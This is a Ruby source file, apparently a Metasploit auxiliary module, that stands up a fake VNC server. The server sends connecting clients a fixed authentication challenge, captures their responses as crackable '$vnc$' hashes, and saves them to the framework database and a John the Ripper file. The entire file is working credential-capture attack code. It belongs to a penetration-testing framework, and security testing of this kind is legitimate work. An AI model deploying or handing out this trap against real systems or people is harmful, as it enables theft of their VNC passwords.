##
# $Id: vnc.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'           => 'Authentication Capture: VNC',
			'Version'        => '$Revision: 14774 $',
			'Description'    => %q{
				This module provides a fake VNC service that
			is designed to capture authentication credentials.
			},
			'Author'         => 'Patrik Karlsson patrik[at]cqure.net',
			'License'        => MSF_LICENSE,
			'Actions'        => [ [ 'Capture' ] ],
			'PassiveActions' => [ 'Capture' ],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5900 ]),
				OptString.new('CHALLENGE', [ true, "The 16 byte challenge", "00112233445566778899AABBCCDDEEFF" ]),
				OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{32})$/
			@challenge = [ datastore['CHALLENGE'] ].pack("H*")
		else
			print_error("CHALLENGE syntax must match 1122334455667788")
			return
		end
		exploit()
	end

	def on_client_connect(c)
		@state[c] = {
			:name    => "#{c.peerhost}:#{c.peerport}",
			:ip      => c.peerhost,
			:port    => c.peerport,
			:pass    => nil,
			:chall   => nil
		}

		c.put "RFB 003.007\n"
	end

	def on_client_data(c)
		data = c.get_once
		return if not data

		if data.match("^RFB")
			sectype = [0x00000002].pack("N")
			@state[c][:chall] = ["00112233445566778899AABBCCDDEEFF"].pack("H*")
			c.put sectype
			c.put @state[c][:chall]
		elsif @state[c][:chall]
			c.put [0x00000001].pack("N")
			c.close
			print_status("VNC LOGIN: Challenge: #{@challenge.unpack('H*')}; Response: #{data.unpack('H*')}")
			report_auth_info(
				:host  => c.peerhost,
				:port => datastore['SRVPORT'],
				:sname => 'vnc_challenge',
				:user => "",
				:pass => "$vnc$*#{@state[c][:chall].unpack("H*")}*#{data.unpack('H*')}",
				:type => "vnc_hash",
				:proof => "$vnc$*#{@state[c][:chall].unpack("H*")}*#{data.unpack('H*')}",
				:source_type => "captured",
				:active => true
			)

			if(datastore['JOHNPWFILE'])
				fd = File.open(datastore['JOHNPWFILE'] + '_vnc' , "ab")
				fd.puts "$vnc$*#{@state[c][:chall].unpack("H*")}*#{data.unpack('H*')}"
				fd.close
			end
		end
	end

	def on_client_close(c)
		@state.delete(c)
	end
end
